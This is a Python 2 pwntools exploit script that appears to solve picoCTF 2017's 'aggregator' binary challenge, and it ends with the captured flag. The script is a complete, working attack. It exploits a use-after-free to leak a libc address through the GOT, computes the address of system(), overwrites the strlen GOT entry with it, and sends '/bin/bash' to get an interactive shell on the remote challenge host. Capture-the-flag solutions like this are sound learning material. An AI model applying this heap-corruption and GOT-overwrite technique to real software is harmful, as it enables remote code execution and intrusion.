#! /usr/bin/env python2

from pwn import *

if args['REMOTE']:
    r = remote("shell2017.picoctf.com", 9611)
elif args['QIRA']:
    r = remote("192.168.0.7", 4000)
else:
    r = process("./aggregator.orig")

off_libc_start_main = 0x21a50
off_system = 0x41490
p_libc_start_main = 0x601f10
p_strlen = 0x601f00

# create a thing
r.sendline("1-1-2016 400")
# free the thing
r.sendline("~1-1-2016")
# send an invalid command to overwrite the thing
r.send(p64(p_libc_start_main) + "\x01" + "\x00" * 7 + p64(0xffffffffffffffff) + p64(1) + "\x00" * 7)
r.recvline()
# read out the data
r.sendline("a+ 1-2016")

libc_start_main = int(r.recvline().strip()) & 0xffffffffffffffff
libc_base = libc_start_main - off_libc_start_main
system = libc_base + off_system

print "libc_start_main = {}".format(hex(libc_start_main))
print "system          = {}".format(hex(system))

# create a thing
r.sendline("2-1-2016 400")
# free the thing
r.sendline("~2-1-2016")
# send an invalid command to overwrite the thing
r.send(p64(p_strlen - 8) + "\x01" + "\x00" * 7 + p64(0x0000ffffffffffff) + p64(1) + "\x00" * 7)
r.recvline()
# write system to p_strlen
r.sendline("2-1-2016 {}".format(system))

r.sendline("/bin/bash")
r.interactive()

# flag: 31e38399f95554a57b0d2f28948b5a37
